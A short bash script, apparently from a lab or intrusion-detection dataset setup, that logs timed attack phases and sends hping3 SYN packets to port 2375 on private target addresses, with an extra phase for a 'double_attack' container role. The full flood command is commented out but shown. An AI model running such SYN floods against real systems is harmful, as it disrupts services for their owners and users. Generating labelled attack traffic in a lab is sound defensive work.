#!/bin/bash

LOGFILE="/attacks/logs/attacks.log"
TARGET_IP="172.25.0.20"
TARGET2_IP="172.25.0.21"
IFACE="eth0"

SYN_TIME=20
ARP_TIME=20
PAUSE=10

sleep 120
echo "[$(date)] Attack start" >> "$LOGFILE"

# ---- SYN FLOOD (fase 1) ----
echo "[$(date)] SYN flood start" >> "$LOGFILE"
#hping3 -S --flood -p 2375 "$TARGET_IP" >>"$LOGFILE" 2>&1
timeout 15s hping3 -S -p 2375 "$TARGET_IP"> /dev/null 2>&1

echo "[$(date)] SYN flood end" >> "$LOGFILE"

echo "[$(date)] Attack end" >> "$LOGFILE"


sleep 10

# ---- solo per double_attack ----
if [[ "$CONTAINER_ROLE" == "double_attack" ]]; then
  echo "[$(date)] Extra SYN flood start (double_attack)" >> "$LOGFILE"
  timeout "${SYN_TIME}s" hping3 -S -p 2375 "$TARGET_IP" > /dev/null 2>&1 || true
  echo "[$(date)] Extra SYN flood end (double_attack)" >> "$LOGFILE"
fi
